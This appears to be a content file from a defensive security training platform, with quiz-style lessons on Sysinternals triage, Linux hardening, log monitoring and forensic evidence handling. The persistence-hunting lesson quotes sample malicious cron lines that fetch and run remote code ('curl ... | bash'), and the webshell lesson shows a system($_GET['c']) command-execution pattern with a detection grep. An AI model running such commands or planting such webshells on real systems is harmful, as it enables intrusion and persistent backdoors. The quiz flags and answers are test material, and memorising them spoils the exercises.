tasks.teach: Sysinternals is a free suite of deep Windows utilities — created by Mark Russinovich and now published by Microsoft — that show you what Windows is really doing under the hood. For defenders they are the go-to live-triage toolkit: inspect processes, trace file/registry activity, hunt persistence, and see network connections, far beyond the built-in tools. Get them from Microsoft (or run them from Sysinternals Live), accept the EULA, and run as admin.
tasks.chal: Who now publishes the Sysinternals suite (and the only source you should download it from)? Submit TG{•••••••••}.
tasks.learn: Microsoft — download only from Microsoft/Sysinternals Live. Fake 'Sysinternals' downloads are a known malware lure; verify the source.
tasks.example: The star tools: Process Explorer, Process Monitor, Autoruns, TCPView, Sigcheck, Strings, PsTools and Sysmon — a whole DFIR kit for free.

tasks.title: Process Explorer
tasks.teach: Process Explorer is Task Manager on steroids: a live process tree showing parent-child lineage, each process's handles and loaded DLLs, its command line, and — crucially — the digital signature of its image. You can submit hashes to VirusTotal right from the UI. An unsigned process with a random name spawned by Office, or a 'svchost' not parented by services.exe, jumps out immediately.
tasks.chal: Which Sysinternals tool is a supercharged Task Manager showing the process tree, signatures and handles? Submit TG{•••••••_••••••••}.
tasks.learn: Process Explorer — verify signatures, read the tree, check VirusTotal. The first tool you open on a suspicious host.
tasks.example: Colour cues: unsigned/packed processes stand out; right-click → Check VirusTotal flags a known-bad hash in seconds.

lab.intro: List processes with signature and VirusTotal status.

steps.out:
explorer.exe    Signed (Microsoft)     VT 0/70
powershell.exe  Signed (Microsoft)     VT 0/70
u8f3.exe        UNSIGNED  C:\Users\Public  VT 54/70   <- malicious

steps2: Open Process Explorer; enable Verify Signatures and VirusTotal columns
Find the unsigned process with a high VT score
Name this tool (two words).

tasks.title: Process Monitor
tasks.teach: Process Monitor (Procmon) captures, in real time, every file, registry, process and network operation on the system — a firehose you tame with filters (by process, path, operation, result). It answers 'what is this program actually touching?' — the file it drops, the Run key it writes, the config it reads. Indispensable for malware analysis and for troubleshooting 'why does this app fail?'.
tasks.chal: Which Sysinternals tool traces live file, registry, process and network activity (with filtering)? Submit TG{•••••••_•••••••}.
tasks.learn: Process Monitor — the activity firehose. Filter hard (by process/path/result) or you drown; it shows exactly what a program reads, writes and runs.
tasks.example: Catch persistence being set: filter Operation=RegSetValue, Path contains \Run — you see the malware write its autostart as it happens.

tasks.title: Autoruns & persistence
tasks.teach: Autoruns enumerates every place Windows can automatically start code — Run/RunOnce keys, scheduled tasks, services, drivers, startup folders, logon scripts, WMI, browser add-ons, and more. It is the definitive persistence-hunting tool: it shows what runs at boot/logon, verifies signatures, and can check VirusTotal. An unsigned or oddly-named entry in an autostart location is classic persistence.
tasks.chal: Which Sysinternals tool lists every autostart location to hunt persistence? Submit TG{••••••••}.
tasks.learn: Autoruns — the persistence map. Hide signed Microsoft entries to focus on the suspicious few; verify signatures and check VirusTotal on the rest.
tasks.example: Tip: 'Hide Microsoft Entries' collapses the noise so the one unsigned Run key pointing at C:\Users\Public is obvious.

lab.intro: Hunt autostart persistence for an unsigned entry.

steps.out:
HKCU\...\Run  Updater  C:\Users\Public\u8f3.exe  (Not signed)  VT 54/70  <- persistence
Task  \Updater  powershell -enc ...  (Not signed)

steps2: Run Autoruns; hide signed Microsoft entries
Review remaining autostarts for unsigned/odd entries
Name this persistence-hunting tool.

tasks.title: TCPView
tasks.teach: TCPView shows every TCP/UDP connection and listening port with the owning process — so you see not just that a connection to a suspicious IP exists, but exactly which process made it. It is the fast way to spot a beacon or an unexpected listener and tie it to a program, right on the host (where netstat -b is clumsier).
tasks.chal: Which Sysinternals tool shows live network connections mapped to the owning process? Submit TG{•••••••}.
tasks.learn: TCPView — connection-to-process in real time. Spot the beacon and immediately know which process (and parent) owns it.
tasks.example: You see u8f3.exe → 93.184.x.x:443 recurring — TCPView ties the suspicious destination straight to the malicious process.

tasks.title: Sigcheck & Strings
tasks.teach: Two file-triage tools. Sigcheck verifies a file's digital signature and version info and can query VirusTotal by hash — the quick 'is this binary legit?' check. Strings dumps the readable text inside a binary (URLs, IPs, commands, suspicious markers), a first-look at what an unknown executable might do without running it.
tasks.chal:
C:\> sigcheck -vt C:\Users\Public\u8f3.exe Verified: Unsigned VirusTotal: 54/70 detections <- malicious

Which Sysinternals tool verifies a file's digital signature (and checks VirusTotal by hash)? Submit TG{••••••••}.
tasks.learn: Sigcheck — signature + VirusTotal in one command. Strings complements it by revealing embedded URLs/IPs/commands in the file.
tasks.example: sigcheck -vt file.exe → Unsigned + 54/70 = done. strings file.exe might reveal the C2 URL baked inside.

lab.intro: Verify a suspicious binary's signature and reputation.

steps.out:
Verified:   Unsigned
Publisher:  n/a
VirusTotal: 54/70 detections   <- malicious

steps2: Run sigcheck -vt <file> on the suspect binary
Read the signature verdict and VirusTotal ratio
Name this signature-check tool.

tasks.title: PsExec & PsTools
tasks.teach: The PsTools are command-line remote-admin utilities. PsExec runs a program on a remote machine — hugely useful for admins, and heavily abused by attackers for lateral movement (it is a classic 'move to the next host' tool). Treat PsExec as dual-use: monitor and alert on its use (service creation, Event 7045), restrict who can run it, and recognise it in an intrusion as a lateral-movement signal.
tasks.chal: Which PsTools utility runs programs on remote hosts and is a classic attacker lateral-movement tool? Submit TG{••••••}.
tasks.learn: PsExec — powerful for admins, favourite of attackers. Alert on its service-creation footprint (7045) and restrict it; its use mid-incident means lateral movement.
tasks.example: PsExec creates a temporary service to run remotely — Event 7045 'a service was installed' with a random name is its tell in the logs.

tasks.title: AccessChk
tasks.teach: AccessChk reports the effective permissions a user or group actually has on files, folders, registry keys, services and processes — cutting through inherited/nested ACLs to the real answer. It is how you find privilege-escalation paths: a service a standard user can modify, a folder in the PATH that users can write to, an over-permissive registry key.
tasks.chal: Which Sysinternals tool reports the effective permissions a user has on files/services/registry? Submit TG{•••••••••}.
tasks.learn: AccessChk — effective-permission truth. Use it to hunt weak ACLs on services and paths that enable privilege escalation.
tasks.example: accesschk -w Users C:\Program Files\App → if Users can write there, a planted DLL/binary could run with the app's privileges.

tasks.title: Sysmon
tasks.teach: Sysmon (System Monitor) is the Sysinternals tool that turns a host into a rich telemetry source: it logs detailed events to the Windows event log — process creation (Event ID 1) with full command line and hashes, network connections (3), image loads (7), file creates (11), registry changes and more. Driven by a good config (e.g. the SwiftOnSecurity template), Sysmon is the single best free upgrade to Windows detection and the backbone of host hunting.
tasks.chal: Which Sysinternals tool adds deep host telemetry (process-create ID 1, network ID 3) to the event log? Submit TG{••••••}.
tasks.learn: Sysmon — the free detection powerhouse. Deploy with a solid config and ship it to the SIEM; Event ID 1 (process + command line + hash) alone transforms visibility.
tasks.example: Default Windows barely logs process creation; Sysmon ID 1 gives command line, hashes and parent — the data every hunt and EDR-style detection needs.

tasks.title: Scenario: live-triage a host
tasks.teach:
A host looks compromised. You run the suite in order: Process Explorer (an unsigned process, VT 54/70), TCPView (it beacons to a rare IP), Autoruns (it added a Run key and a scheduled task), Sigcheck/Strings (unsigned, C2 URL inside), Procmon (what it touched). Throughout you follow a discipline — work methodically, preserve evidence, note everything, and handle PsExec carefully — that has a name.

🔑 Key point

Live response — methodical on-host triage that preserves evidence. The Sysinternals suite is the free toolkit; discipline (and Sysmon telemetry) make it reliable.
tasks.chal: What is the disciplined, evidence-preserving on-host investigation approach the suite supports called (two words)? Submit TG{••••_••••••••}.
tasks.learn: Live response — methodical on-host triage that preserves evidence. The Sysinternals suite is the free toolkit; discipline (and Sysmon telemetry) make it reliable.
tasks.example: Order matters: capture volatile first (processes, connections), verify with signatures/VT, map persistence with Autoruns, and document every step.

rooms.title: Linux Hardening
rooms.subtitle: Least privilege and defence in depth — users, SUID, SSH, firewall and MAC.
rooms.blurb: Fix permissions and SUID pitfalls, harden SSH and services, build a default-deny firewall, and confine with SELinux/AppArmor.

tasks.title: root and the permission model
tasks.teach:
Linux access control starts with users and permissions. Every user has a numeric UID; the one that matters most is root — UID 0 — the superuser that bypasses all permission checks. Protecting root is the single highest priority: you do not log in as root, you do not allow direct root SSH, and you grant root power narrowly via sudo (which logs). Every file has an owner, a group, and rwx (read/write/execute) permissions for owner/group/other.

Why it matters: most Linux compromise is about becoming root. If root is locked down and users have only the permissions they need, an attacker who lands as a normal user is boxed in.
tasks.chal: Which account (UID 0) bypasses all permission checks and must be protected most? Submit TG{••••}.
tasks.learn: root (UID 0) — bypasses everything. Disable direct root login, use sudo for elevation, and keep daily accounts unprivileged.
tasks.example: The whole game: keep attackers off UID 0. A bug in a service running as root = instant full compromise; the same bug as an unprivileged user = contained.

tasks.title: Permissions & octal
tasks.teach: Permissions are three sets of rwx — for owner, group and other — shown as -rwxr-xr-- and set with chmod. In octal, read=4, write=2, execute=1, so a digit sums them: 7 = rwx, 6 = rw-, 5 = r-x, 4 = r--. Thus 644 (rw-r--r--) suits a file, 755 (rwxr-xr-x) a program or directory. Over-permissive files — world-writable configs, a 777 web directory — are a classic weakness.
tasks.chal:
$ ls -l /etc/app.conf -rw-rw-rw- 1 root root 240 app.conf <- 666: world-writable, weak $ chmod 640 /etc/app.conf # owner rw, group r, others none

In octal permissions, which single digit means full read+write+execute (rwx)? Submit TG{•}.
tasks.learn: 7 = rwx (4+2+1). Read the bits to spot risk: a config that is world-writable (the last digit allows write) is a finding.
tasks.example: 644 = file anyone can read, only owner writes. 755 = program anyone can run, only owner writes. 777 = everyone can do anything — almost never right.

lab.intro: Read a file's permissions and spot an over-permissive one.

steps.out: -rw-rw-rw- 1 root root 240 Oct 30 09:14 /etc/app.conf   <- 666: world-writable (weak)

steps2: Run ls -l <file> and read the rwx bits
A world-writable config is weak — tighten with chmod
Which octal digit means full rwx?

tasks.title: SUID & SGID pitfalls
tasks.teach: The special permission bits cause a huge share of real Linux privilege escalation. A SUID (Set User ID) binary runs with the permissions of its owner — often root — no matter who launches it. That is by design for tools like passwd, but a SUID-root binary that can be abused (or a custom one left SUID by mistake) hands any user root. Auditing SUID/SGID binaries — and removing the bit where it isn't needed — is core hardening.
tasks.chal:
$ find / -perm -4000 -type f 2>/dev/null /usr/bin/passwd (expected) /usr/bin/sudo (expected) /opt/app/backup.sh <- custom SUID-root script! priv-esc risk

Which special bit makes a binary run as its owner (often root), regardless of who runs it? Submit TG{••••}.
tasks.learn: SUID — runs as the owner. Audit with find / -perm -4000; an unexpected SUID-root file (especially a script) is a privilege-escalation path to remove.
tasks.example: GTFOBins lists SUID binaries attackers abuse to pop a root shell. The defence: minimise SUID binaries and remove the bit where it isn't essential.

lab.intro: Find SUID-root binaries and spot an unexpected one.

steps.out:
/usr/bin/passwd
/usr/bin/sudo
/opt/app/backup.sh   <- unexpected custom SUID-root: investigate/remove

steps2: Run find / -perm -4000 -type f 2>/dev/null
Compare against the expected system binaries
Name the special bit that runs a file as its owner.

tasks.title: sudo done right
tasks.teach: Instead of sharing the root password, you grant specific users the right to run specific commands as root via sudo — and every use is logged (to auth.log/journald). Good practice: grant least privilege in /etc/sudoers (specific commands, not blanket ALL), require the user's own password, avoid NOPASSWD except where justified, and watch for sudo misconfigurations (a wildcard or an editable script run as root) that become escalation paths.
tasks.chal: What command runs a command as root (usually), with each use logged? Submit TG{••••}.
tasks.learn: sudo — scoped, logged elevation. Grant specific commands, not ALL; audit /etc/sudoers for dangerous wildcards and NOPASSWD entries.
tasks.example: Least privilege: webadmin ALL=(root) /bin/systemctl restart nginx lets them restart nginx and nothing else — not a blanket root shell.

tasks.title: Harden SSH
tasks.teach: SSH is the front door to a Linux server, so it is hardened first. Key settings in /etc/ssh/sshd_config: PermitRootLogin no (never allow direct root login — force sudo), PasswordAuthentication no (use keys, not guessable passwords), limit users/groups, and change nothing security-critical to weaker. Together these defeat the overwhelmingly common attack: automated root/password brute-forcing against port 22.
tasks.chal:
# /etc/ssh/sshd_config PermitRootLogin no # no direct root over SSH PasswordAuthentication no # keys only PubkeyAuthentication yes

Which sshd_config setting must be 'no' to stop direct root login over SSH? Submit TG{•••••••••••••••}.
tasks.learn: PermitRootLogin — set to no. With key-only auth and no root login, SSH brute force dies; admins log in as themselves and sudo.
tasks.example: Before: root brute-forced 10,000×/day. After PermitRootLogin no + keys: those attempts can never succeed, whatever the password.

lab.intro: Check the SSH daemon config for root login.

steps.out:
permitrootlogin yes          <- weak: disable
passwordauthentication yes   <- weak: use keys

steps2: Check the effective config: sshd -T | grep permitrootlogin
If yes, set it to no and reload sshd
Name the setting that controls direct root SSH.

tasks.title: SSH keys over passwords
tasks.teach: Passwords are guessable and reusable; SSH keys are not. You generate a key pair, put the public key in the server's ~/.ssh/authorized_keys, and keep the private key (passphrase-protected) on your machine. The server proves you hold the private key without it ever crossing the wire. With PasswordAuthentication no, key auth is the only way in — immune to password brute force.
tasks.chal: What authentication method replaces passwords for SSH, immune to brute force? Submit TG{•••_••••}.
tasks.learn: SSH keys — public on the server, private (passphrase-protected) with you. Combined with PasswordAuthentication no, brute force becomes pointless.
tasks.example: Protect the private key with a passphrase and, ideally, a hardware token — a stolen key file alone shouldn't grant access.

tasks.title: Default-deny firewall
tasks.teach: A hardened host runs a host firewall (via netfilter, configured with nftables, iptables, ufw or firewalld) on a default-deny policy: block everything inbound, then allow only the ports the server actually needs (e.g. 22 and 443). Every closed port is attack surface removed — the same principle as a network firewall, applied on the host itself.
tasks.chal:
$ sudo ufw status verbose Default: deny (incoming), allow (outgoing) To Action From 22/tcp ALLOW Anywhere 443/tcp ALLOW Anywhere

What inbound firewall policy blocks everything except explicitly allowed ports? Submit TG{•••••••_••••}.
tasks.learn: Default-deny — deny inbound, allow only required ports. A service you forgot to expose simply fails closed; nothing is open by accident.
tasks.example: ufw default deny incoming then ufw allow 22,443 — the box answers on exactly two ports and is invisible on the rest.

lab.intro: Check the host firewall policy and allowed ports.

steps.out:
Default: deny (incoming), allow (outgoing)
22/tcp  ALLOW  Anywhere
443/tcp ALLOW  Anywhere

steps2: Run sudo ufw status verbose (or nft list ruleset)
Confirm inbound default is deny and only needed ports are allowed
Name this inbound policy (two words).

tasks.title: Minimise services & patch
tasks.teach: Hardening is subtraction here too: every running service is a listening target, so you disable and remove what you don't need (systemctl disable --now), close unused ports, uninstall unnecessary packages, and patch promptly — unpatched services are the most-exploited surface of all. Fewer services means less to attack, patch and monitor.
tasks.chal: Disabling unused services and removing packages reduces the ___ (two words)? Submit TG{••••••_•••••••}.
tasks.learn: Attack surface — minimise services, close ports, patch fast. A server should run the few daemons its role needs and nothing more.
tasks.example: ss -tlpn lists listeners; every one you can't justify is a service to disable. Then automate patching so known bugs don't linger.

tasks.title: Mandatory access control
tasks.teach: Standard Linux permissions are discretionary (owners set them). Mandatory Access Control (MAC) adds a system-enforced policy on top: SELinux (Red Hat family) and AppArmor (Debian/Ubuntu) confine each service to only the files, ports and actions it is supposed to use — so even a compromised service can't roam. SELinux runs in enforcing mode (actively blocks) or permissive (only logs); enforcing is the goal.
tasks.chal:
$ getenforce Enforcing <- SELinux is actively confining services

Which SELinux mode actively blocks policy violations (not just logs them)? Submit TG{•••••••••}.
tasks.learn: Enforcing — SELinux blocks what policy forbids. Permissive only logs (useful for tuning). AppArmor is the Debian/Ubuntu equivalent with profiles.
tasks.example: MAC contains breakout: a compromised nginx confined by SELinux/AppArmor still can't read /etc/shadow or spawn a shell outside its profile.

lab.intro: Check whether mandatory access control is actively enforcing.

steps.out: Enforcing

apparmor module is loaded.
30 profiles are in enforce mode.

steps2: Run getenforce (SELinux) or aa-status (AppArmor)
Confirm it is Enforcing, not Permissive/complain
Name the active-blocking mode.

tasks.title: Scenario: harden a web server
tasks.teach:
You harden a public Linux web server: non-root service account, tight file permissions, no SUID surprises, PermitRootLogin no + key-only SSH, a default-deny firewall allowing only 22 and 443, minimal services, prompt patching, and AppArmor confining nginx. Every measure expresses the same two ideas — give each thing only what it needs, and never rely on a single control.

🔑 Key point

Least privilege — with defence in depth (layered controls), it turns a foothold into a dead end. The hardened server gives an attacker nothing to stand on.
tasks.chal: Which principle — give each user/service only the access it needs — underlies all of this? Submit TG{•••••_•••••••••}.
tasks.learn: Least privilege — with defence in depth (layered controls), it turns a foothold into a dead end. The hardened server gives an attacker nothing to stand on.
tasks.example: Defence in depth: if one layer fails (say a web bug), the non-root account, AppArmor confinement and firewall each still limit what the attacker can reach.

rooms.title: Linux Monitoring
rooms.subtitle: You can't stop what you can't see — logs, auditd, integrity and the hunt.
rooms.blurb: Read the logs, watch files with auditd, baseline with AIDE, and hunt brute force, persistence and webshells.

tasks.title: Why monitor — assume breach
tasks.teach: Monitoring exists because prevention is never perfect: you must be able to see what happens on a host and respond when it's an attack. The guiding mindset is assume breach — operate as though an attacker may already be inside, and build the visibility to find them. The handbook's blunt version: you can't stop what you can't see. The pillars are logging, auditing, file-integrity monitoring and hunting.
tasks.chal: What mindset — act as though an attacker is already inside — guides host monitoring? Submit TG{••••••_••••••}.
tasks.learn: Assume breach — build visibility to detect and investigate, not just to prevent. You can't respond to what you never logged.
tasks.example: Prevention keeps most out; assume-breach monitoring catches the one who got in — before a foothold becomes a full compromise.

tasks.title: The logs and where they live
tasks.teach:
Know your log paths. /var/log/auth.log (Debian) or /var/log/secure (RHEL) is the security log — logins, sudo, SSH, authentication. /var/log/syslog/messages holds general system messages, /var/log/kern.log the kernel, and apps log under their own dirs (e.g. /var/log/nginx/). For investigating access and abuse, auth.log is where you look first.

🔑 Key point

auth.log (/var/log/auth.log; secure on RHEL) — the security log. First stop for brute force, sudo abuse and suspicious logins.

Key term: AUTH.LOG
tasks.chal:
$ grep -E "Failed password|Accepted" /var/log/auth.log | tail Oct30 09:02 sshd: Failed password for root from 203.0.113.9 (x40) Oct30 09:03 sshd: Accepted password for rnehra from 203.0.113.9

Which log file records logins, sudo and SSH authentication on Debian/Ubuntu? Submit TG{••••.•••}.
tasks.learn: auth.log (/var/log/auth.log; secure on RHEL) — the security log. First stop for brute force, sudo abuse and suspicious logins.
tasks.example: Many 'Failed password' then an 'Accepted' from the same IP (above) is brute-force success — the single most important auth.log pattern.

lab.intro: Read authentication events from the security log.

steps.out:
sshd: Failed password for root from 203.0.113.9 (repeated 40x)
sshd: Accepted password for rnehra from 203.0.113.9   <- after failures

steps2: Grep the security log for Failed/Accepted entries
Look for failures followed by a success from one IP
Name this security log file.

tasks.title: journald
tasks.teach: Systemd systems add the journal — a structured, queryable log of services, boot, and the kernel — read with journalctl. It is powerful for scoped queries: journalctl -u ssh (just the SSH service), journalctl _COMM=sudo (every sudo use), --since "today", and filtering by priority. It complements the text logs and is often where service-level evidence lives.
tasks.chal: Which command queries the systemd journal (services, boot, kernel)? Submit TG{••••••••••}.
tasks.learn: journalctl — structured, filterable logs. journalctl _COMM=sudo shows every sudo use; -u ssh scopes to the SSH service.
tasks.example: journalctl -u ssh --since "today" | grep -i fail — today's SSH failures, straight from the journal, no log file hunting.

lab.intro: Query the journal for every sudo invocation.

steps.out:
09:10 rnehra : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/bin/systemctl restart nginx
09:41 webops : USER=root ; COMMAND=/bin/bash   <- a root shell? investigate

steps2: Run journalctl _COMM=sudo --since today
Look for unexpected users elevating or spawning a root shell
Name the journal query tool.

tasks.title: Central logging
tasks.teach: An attacker who roots a host will try to erase the logs to cover their tracks — so local logs alone can't be trusted. Central logging forwards logs off the host in real time (rsyslog/syslog to a central server or SIEM) so the evidence survives even if the local copy is wiped. If a host's logs are cleared, the central copy still tells the story — and the sudden silence is itself an alert.
tasks.chal: Forwarding logs off the host so they survive tampering is called ___ (two words)? Submit TG{•••••••_•••••••}.
tasks.learn: Central logging — off-host, real-time. Cleared local logs lose nothing, and a host that stops forwarding raises its own alarm.
tasks.example: Attacker runs echo > /var/log/auth.log — too late; rsyslog already shipped every line to the central server/SIEM.

tasks.title: auditd
tasks.teach: For deep accountability, auditd — the Linux Audit daemon — records security-relevant events at the kernel level: you write rules to watch specific files (alert on any change to /etc/passwd) and syscalls (execve, chmod). You read the results with ausearch and summarise with aureport. auditd answers 'who touched this file, exactly when, running what' — the questions logs alone can't.
tasks.chal:
$ sudo auditctl -w /etc/passwd -p wa -k passwd_changes $ sudo ausearch -k passwd_changes type=SYSCALL ... uid=1002 (webops) exe=/usr/bin/vi /etc/passwd <- who edited it

Which Linux daemon watches files and syscalls for auditing (read with ausearch)? Submit TG{••••••}.
tasks.learn: auditd — kernel-level accountability. Watch sensitive files (-w) and syscalls; ausearch -k retrieves by key, aureport summarises.
tasks.example: Rule: watch /etc/shadow. Now any read/write is recorded with the user and process — you know instantly if an attacker touched the password hashes.

lab.intro: Query auditd for changes to a watched sensitive file.

steps.out:
type=SYSCALL uid=1002 (webops) exe=/usr/bin/vi  path=/etc/passwd  success=yes
 -> unexpected user edited /etc/passwd

steps2: Watch a file: auditctl -w /etc/passwd -p wa -k passwd_changes
Query it: ausearch -k passwd_changes
Name the audit daemon.

tasks.title: File-integrity monitoring (AIDE)
tasks.teach: Attackers modify files — replace a binary, drop a webshell, edit a config for persistence. AIDE (Advanced Intrusion Detection Environment) is Linux file-integrity monitoring: it builds a baseline of cryptographic hashes for the files you care about, then on each check reports anything added, changed or deleted. A modified system binary or a new file in a sensitive directory shows up immediately. (Store the baseline off-host so the attacker can't rewrite it.)
tasks.chal: Which Linux tool baselines file hashes and alerts on tampering (file-integrity monitoring)? Submit TG{••••}.
tasks.learn: AIDE — hash baseline + change detection. It catches replaced binaries, dropped webshells and tampered configs. Keep the baseline DB off-host.
tasks.example: aide --check reports: added: /var/www/html/up.php, changed: /bin/ls — a webshell and a trojaned binary, both caught by hash.

lab.intro: Run an integrity check and read what changed.

steps.out:
AIDE found differences:
 added:   /var/www/html/up.php      <- possible webshell
 changed: /usr/bin/ls  (sha256 changed) <- trojaned binary?

steps2: Run aide --check against the baseline
Review added/changed/removed files
Name this file-integrity tool.

tasks.title: Detect brute force
tasks.teach: The most common Linux attack on the internet is SSH brute force, and it is loud in auth.log: repeated "Failed password" lines from one source, and the dangerous case — many failures followed by an "Accepted" (brute-force success). You hunt it by counting failures per source IP, and you prevent it with keys, PermitRootLogin no, and tools like fail2ban that auto-block offending IPs.
tasks.chal:
$ grep "Failed password" /var/log/auth.log | awk '{print $NF}' | sort | uniq -c | sort -rn 412 203.0.113.9 <- hammering 3 10.10.10.21

Which auth.log phrase marks a failed SSH login attempt (counted to find brute force)? Submit TG{••••••_••••••••}.
hints: The log text for a bad login.
tasks.learn: Failed password — count by source IP to find brute force; a trailing Accepted from the same IP means it succeeded. fail2ban auto-blocks the source.
tasks.example: 412 failures then one 'Accepted' from 203.0.113.9 = compromised account. The fix is key-only auth, so no number of guesses can ever win.

lab.intro: Count SSH brute-force sources from the security log.

steps.cmd: grep "Failed password" /var/log/auth.log | grep -oE "from [0-9.]+" | sort | uniq -c | sort -rn | head

sugg: grep "Failed password" /var/log/auth.log | grep -oE "from [0-9.]+" | sort | uniq -c | sort -rn

steps2: Grep auth.log for failed logins, group by source IP
The top source hammering SSH is the brute-forcer
Submit the auth.log phrase for a failed login.

tasks.title: Hunt persistence
tasks.teach: After access, attackers plant persistence to survive reboots. On Linux the usual spots: cron jobs (crontab -l, /etc/cron.*, /var/spool/cron), systemd services and timers, startup scripts, and added SSH authorized_keys. You hunt by listing these and chasing anything unexpected — a cron job calling a script in /tmp, or a new key in root's authorized_keys, is a classic backdoor.
tasks.chal:
$ for u in $(cut -f1 -d: /etc/passwd); do crontab -l -u $u 2>/dev/null; done */10 * * * * curl -s http://93.184.x.x/b | bash <- malicious cron (webops)

Which scheduling mechanism is a classic Linux persistence location (jobs that re-run on a timer)? Submit TG{••••}.
tasks.learn: cron — check every user's crontab and /etc/cron.*. A job pulling and running a remote script is persistence; also check systemd timers and authorized_keys.
tasks.example: Find: a cron entry curl http://evil | bash every 10 min re-establishes the backdoor even after you kill the process. Remove the cron, not just the process.

lab.intro: Hunt all users' cron jobs for a malicious entry.

steps.cmd: for u in $(cut -f1 -d: /etc/passwd); do crontab -l -u $u 2>/dev/null; done
steps.out: */10 * * * * curl -s http://93.184.x.x/b | bash   # user webops  <- backdoor

sugg: for u in $(cut -f1 -d: /etc/passwd); do crontab -l -u $u 2>/dev/null; done

steps2: List every user's crontab and check /etc/cron.* and systemd timers
Look for jobs fetching and running remote code
Name this scheduling mechanism.

tasks.title: Hunt webshells & rootkits
tasks.teach: Two stealthy artefacts to hunt. A webshell is a small malicious script dropped into a web server's document root that lets an attacker run commands via a web request — a persistent remote shell hiding among legitimate pages. You hunt it by looking for recently created or modified script files in the web root, and files whose content calls command-execution functions. A rootkit hides deeper — altering system tools or the kernel to conceal the attacker; tools like rkhunter/chkrootkit plus AIDE help surface it.
tasks.chal:
$ find /var/www -name '*.php' -mtime -2 -printf '%Tc %p\n' Fri Oct 30 09:41 /var/www/html/up.php <- new, tiny, calls system() = webshell $ grep -l -E 'system|passthru|eval\(\$_' /var/www/html/*.php /var/www/html/up.php

What is a malicious script in the web root that gives an attacker remote command execution called? Submit TG{••••••••}.
hints: A shell reached over the web.
tasks.learn: Webshell — hunt recently-changed scripts in the web root that call system()/eval($_...). AIDE catches the drop; rkhunter/chkrootkit hunt rootkits.
tasks.example: Find: a 2 KB up.php created today in the web root calling system($_GET['c']) — the attacker runs commands via ?c=whoami.

lab.intro: Hunt the web root for a recently-dropped webshell.

steps.out: /var/www/html/up.php   <- created today; grep shows it calls system($_GET) = webshell

steps2: Find recently-modified scripts in the web root
Check them for command-exec functions (system/eval)
Name this web-root remote shell.

tasks.title: Scenario: triage a compromised host
tasks.teach: A server looks off. You read auth.log (412 failures then an Accepted from 203.0.113.9 — brute-force success), journalctl (that account then sudo'd to root), AIDE (a new up.php webshell in the web root and a changed binary), and cron (a curl|bash backdoor). The whole intrusion started with one preventable thing — an account taken over by guessing its password.
tasks.chal: What is the attack — many password guesses until one works — that gave the attacker the initial foothold? Submit TG{•••••_•••••}.
tasks.learn: Brute force — the foothold. Central logging preserved the evidence, AIDE found the webshell, and the fix (keys, no root login, fail2ban) stops the next one cold.
tasks.example: Triage order: contain (isolate/kill), preserve (logs are off-host already), scope (auth.log + journal + AIDE + cron), eradicate (webshell, cron, key, rotate creds), then harden SSH so it can't recur.

rooms.title: Forensics Fundamentals & Evidence
rooms.subtitle: Preserve, prove, present — the discipline behind a defensible answer.
rooms.blurb: Run the forensic process, apply the order of volatility, image and hash evidence, and keep chain of custody.

tasks.title: What forensics is — don't change the evidence
tasks.teach:
Digital forensics is the discipline of identifying, preserving, collecting, examining, analysing and reporting on digital evidence so that it is defensible — trustworthy enough to stand up to scrutiny (including in court). Its first and overriding principle: don't change the evidence. Everything you do must preserve the original intact, because the most brilliant analysis is worthless if the evidence was altered or mishandled on the way in.

Why it matters: an investigator who opens files on the original disk, reboots a suspect machine carelessly, or works without a record has already damaged the case. Forensics is as much about discipline and documentation as about technical skill — preserve first, analyse on copies, document everything.
tasks.chal: What is the overriding first principle of forensics — act so you never alter the original? Submit TG{••••••••}.
tasks.learn: Preserve — the original stays untouched; you work on verified copies. Preserve, prove, present: the whole discipline in three words.
tasks.example: Open a file on the original disk and you change its last-accessed timestamp — evidence altered. Work on an image instead; the original is sealed.

tasks.title: The forensic process
tasks.teach: Forensics follows a repeatable process so nothing is missed or done out of order: Identify (what evidence exists and where) → Preserve (secure and image it without change) → Collect (gather it with custody) → Examine (extract the relevant data) → Analyse (interpret what it means) → Report (a clear, defensible account). The final report is the product everyone else relies on — it must be accurate, reproducible, and understandable by non-technical readers.
tasks.chal: Which final phase produces the clear, defensible account of what was found? Submit TG{••••••}.
tasks.learn: Report — findings, method and conclusions, written so a court or manager can follow and trust them. Reproducibility is key: another examiner should reach the same result.
tasks.example: A good report states what you did, the tools and versions, the hashes, and what the evidence shows — not what you assume. Facts, with sources.

tasks.title: Order of volatility
tasks.teach: Evidence disappears at different speeds, so you collect the most volatile first. The order of volatility runs: CPU registers/cache → RAM (memory) → network state → running processes → disk → logs/archival media → backups. RAM is gone the instant the machine powers off (taking running malware, encryption keys and network connections with it), so on a live system you capture memory before disk.
tasks.chal:
Order of volatility (collect first → last): 1 CPU registers & cache (gone in nanoseconds) 2 RAM / memory (gone at power-off) <- capture before shutting down 3 network state, processes 4 disk 5 logs / archival / backups

You collect the most ___ evidence first (RAM before disk). Submit TG{••••••••}.
tasks.learn: Volatile — most-volatile-first. Pulling the plug to 'preserve the disk' destroys the memory, where live malware and keys live. Capture RAM first.
tasks.example: A machine running ransomware holds the encryption key in RAM. Power off to image the disk and the key — maybe your only recovery hope — is gone.

tasks.title: Live vs dead acquisition
tasks.teach: Two acquisition modes. Live acquisition captures data from a running system — essential for volatile evidence (RAM, network connections, decrypted data) and for systems you can't take down. Dead (static) acquisition captures from a powered-off system (image the disk) — cleaner and more defensible because nothing changes, but it loses everything volatile. Modern investigations usually do live first (grab memory and volatile state), then dead (image the disk).
tasks.chal: What is capturing data from a running system (to get RAM and volatile state) called? Submit TG{••••}.
tasks.learn: Live acquisition — gets the volatile evidence a powered-off image can't. Do it carefully and document it, since touching a live system changes some state.
tasks.example: Live triage tools (like a read-only PowerShell triage script) grab RAM, processes and connections first; then you image the disk dead. Order of volatility in action.

tasks.title: Forensic imaging
tasks.teach: You never analyse the original — you analyse a forensic image: an exact, bit-for-bit copy of the storage media, including deleted data and slack space (not just the live files). Tools like dd/dcfldd, FTK Imager or Guymager create images in formats like RAW or E01. The image is hashed on creation so you can later prove it is identical to the source.
tasks.chal:
$ sudo dcfldd if=/dev/sdb of=evidence.dd hash=sha256 hashlog=evidence.sha256 ... 500 GB imaged sha256: 7b3f...a19c (source == image)

What is the exact bit-for-bit forensic copy of a drive called? Submit TG{•••••}.
hints: A bit-for-bit copy, not just files.
tasks.learn: Image — bit-for-bit, captures deleted data and slack too. Hash it on creation; analyse the image, never the original.
tasks.example: A simple file copy misses deleted files and slack space — where evidence often hides. A forensic image captures every bit, including the 'empty' areas.

